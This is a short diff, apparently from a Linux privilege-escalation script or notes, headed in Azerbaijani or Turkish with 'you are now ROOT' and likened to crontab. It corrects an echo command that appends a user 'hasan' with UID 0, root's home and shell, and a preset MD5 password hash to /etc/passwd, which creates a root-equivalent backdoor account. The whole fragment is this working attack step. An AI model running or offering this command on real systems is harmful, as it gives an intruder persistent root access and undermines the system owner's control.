@@ -12,5 +12,4 @@
   
    ## sen artiq ROOT'SAN
 # The working mechanism of this is very similar to crontab
-echo 'hasan:\$1\$hasan$BUMdh4tI4WdCuFkBJI64T:0:0:root:/root:/bin/bash
-' >> /etc/passwd
+echo 'hasan:$1$hasan$BUMdh4tI4WdCuFkBJI64T/:0:0:root:/root:/bin/bash' >> /etc/passwd
